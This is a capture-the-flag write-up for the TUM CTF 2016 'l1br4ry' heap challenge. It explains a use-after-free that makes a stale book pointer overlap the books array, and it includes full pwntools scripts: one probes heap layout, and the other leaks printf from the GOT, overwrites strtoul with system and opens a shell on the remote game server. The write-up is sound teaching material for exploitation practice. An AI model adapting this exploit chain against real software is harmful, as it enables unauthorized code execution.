## Write-up

This binary provides a library where one can add books with title, rating and
'short thoughts'. The books are allocated at the heap and the book struct looks
something like:

```c
struct {
    char name[32];
    char thoughts[32];
    unsigned long rating;
}
```

After playing around a little with the application and looking for issues, we
pretty soon noticed that we could create a use-after free condition by creating
a book, making it our favorite to keep a stale pointer around and then free it.

We can see this with the following example run:

```
Main menu
---------------------------
---------------------------
a: add a new one
q: exit
> a
[0x40092e] vuln->realloc(0, 8)                                          = 0x1ac6420
[0x40094b] vuln->malloc(72)                                             = 0x1ac6440
Title: asdf
Rate the book on a scale from 0 to 10: -1

We can also see that the application uses a realloc'ed array to store the
pointers to the book objects. It took us quite a while to realize how we could
exploit this. If we allocate a lot of books and free them again we might
somehow run into the condition that a book and the books array are in the same
place on the heap. 

If we come to this condition we can use the favorite book pointer to point to
that location and use the edit book code to write to whatever is at that
location. If the books array is there we can write a pointer to another memory
location into the books array.

Then we use the edit books functionality again to write something at that
location. Would be a very nice write-anything-anywhere primitive. 

```
[*] '/media/data/ctf/tumctf_2016/pwn/l1br4ry_300/vuln'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE
```

So we have only partial RELRO, which usually isn't really and obstacle. We'll
find an imported function with a writable GOT entry, so that we can hijack
control flow this way.


But first let's check whether we can reach the aforementioned condition. We
used `ltrace` to log the calls to malloc and realloc and then search through
the output to find a `malloc` (for book objects) and a `realloc` (for the books
array) that have returned the same address. Note that it's important that the
`realloc` calls also shrink the size of the books array, otherwise this would
probably be impossible to exploit.

The following script allocates a bunch of books and then frees them again and
searches the ltrace output for matching calls to `malloc`/`realloc` and outputs
the number of book allocations it took to get there.

```python
from pwn import *

errf = open("./ltrace.out", "w")
vp = process("ltrace -C -i -e 'malloc+free+realloc' ./vuln",
             shell=True, stderr=errf)

# create a couple of books
p = log.progress("allocating books: ")
for i in range(100):
    vp.send("a\n\n\n\n")
    if i & 0xf == 0:
        vp.clean()
        p.status("{} of 100".format(i))
p.success("done")

p = log.progress("deleting books: ")
for i in range(100):
    vp.send("0\nd\n")
    if i & 0xf == 0:
        vp.clean()
        p.status("{} of 100".format(i))
p.success("done")

vp.close()
errf.flush()
errf.close()

realloc_num = 0
reallocs = {}
malloc_num = 0
mallocs = {}

with open("./ltrace.out", "r") as f:
    for line in f.readlines():
        if "realloc" in line:
            addr_r = line.strip().split(" ")[-1]
            addr = int(addr_r, 16)
            reallocs[realloc_num] = addr
            realloc_num += 1
        elif "malloc" in line:
            addr_r = line.strip().split(" ")[-1]
            addr = int(addr_r, 16)
            mallocs[realloc_num] = addr
            malloc_num += 1

for i, r in reallocs.iteritems():
    for j, m in mallocs.iteritems():
        if r == m:
            print(j, "malloc", "==", i, "realloc", hex(m))
```

If we run this script we'll see that this really is the case a couple of times.
But let's stick to the first time:

```
(10, 'malloc', '==', 8, 'realloc', '0x184e2e0')

cat ltrace.out | grep 0x184e2e0
[0x40092e] vuln->realloc(0x184e200, 64)          = 0x184e2e0
[0x40092e] vuln->realloc(0x184e2e0, 72)          = 0x184e2e0
[0x40092e] vuln->realloc(0x184e2e0, 80)          = 0x184e3d0
[0x40094b] vuln->malloc(72)                      = 0x184e2e0
[0x4008d8] vuln->free(0x184e2e0)                 = <void>
```

We can see that if we allocate 8 books, so the books array has size 64, the
books array will be at address `0x184e2e0`. If we allocate another two books,
`realloc` will move the books array to `0x184e3d0`. The next book that is
then allocated with `malloc` is also placed at `0x184e2e0`. 

Now we can set the favorite book pointer to the 10th book. We will then delete
all the books and the books array will be freed as well. Then we allocate 8
books again, but only 8. The books array will be placed at `0x184e2e0` again
and our favorite book pointer will point to exactly this location :) 

A very nice side effect of this condition is that the program will print the 
data at the favorite book pointer, when printing the menu. So we get a very 
nice infoleak for free :)

So we have our nice write-anything-anywhere primitive, an infoleak and
nothing stopping us from popping shells. 

Our plan was to

1. Get to vulnerable program state
2. Leak address of `printf` by writing `printf` got entry to address of first book
3. Compute address of magic shell spawning gadget in libc (from Dragon Sector presentation)
3. Overwrite `printf` GOT entry with this address
4. pop shell and get flag

Unfortunately this didn't work out at all and we spent way too much time trying
to find the reason why. In the end the plan changed to:

3. Compute address of `system`
4. Write address of `strtoul` GOT entry to the address of the first book
5. Overwrite `strtoul` GOT entry with address of `system`
6. Input shell command when asked for score (9 char limit)
7. pop shell and get flag


Our final exploit script:

```python
from pwn import *

velf = ELF("./vuln")
libc = ELF("./libc-2.19.so")  # from debian jesse, according to hint by organizers
# libc = ELF("/usr/lib/libc-2.24.so")

log.info(hex(libc.symbols['printf']))
# printf_to_pwn = libc.symbols['printf'] - 0x0004137b
# printf_to_pwn = libc.symbols['printf'] - 0xd6e77
printf_to_pwn = libc.symbols['printf'] - libc.symbols['system']

log.info("printf_to_pwn is {}".format(hex(printf_to_pwn)))

# vp = process("./vuln") #, env={'LD_PRELOAD': "./libc-2.19.so"})
# gdb.attach(vp, execute="""
# init-peda
# # break * 0x00400b9e
# watch * 0x602048
# """)

vp = remote("130.211.206.204", 1340)


for i in range(10):
    vp.send("a\n\n\n\n")
    vp.clean()

vp.sendline("2")
vp.sendline("f")

for i in range(10):
    vp.send("1\nd\n")

for i in range(8):
    vp.send("a\n\n\n\n")
    vp.clean()

vp.clean()
sleep(1)
vp.clean()

vp.sendline("0")
vp.sendline("e")
vp.sendline(p64(velf.got['printf']))
vp.sendline("")
sleep(1)
vp.clean()
vp.sendline("")


# with context.local(log_level='debug'):
vp.recvuntil("-")
log.debug(vp.recvline())
line = vp.readline()
assert "favorite" in line
line = vp.readline()
log.info(line)
log.info(hexdump(line))
x = line.find("1:") + 2
log.info(hexdump(line[x:].strip()))
y = line[x:].strip()
while len(y) != 8:
    y = y + "\x00"
printf_addr = u64(y)
log.info("got printf addr at: {}".format(hex(printf_addr)))

# vp.interactive()

vp.clean()
# vp.interactive()
# vp.close()

# system_addr = printf_addr - printf_to_pwn
system_addr = printf_addr - (libc.symbols['printf'] - libc.symbols['system'])

log.info("got system addr at: {}".format(hex(system_addr)))

vp.sendline("0")
vp.sendline("e")
vp.sendline(p64(velf.got['strtoul']))
vp.sendline("")
sleep(1)
vp.clean()
vp.sendline("")

vp.sendline("1")
vp.sendline("e")
# vp.sendline(p64(velf.plt['__stack_chk_fail']))
# vp.sendline(p64(0x004007a0))
vp.sendline(p64(system_addr))
#vp.sendline("sh")
vp.sendline("cat flag.txt")
vp.sendline("")


vp.clean_and_log()

vp.interactive()

vp.close()
```

This got us the flag:

```
hxp{5t0re_Y0uR_mu5iCz_2}
```
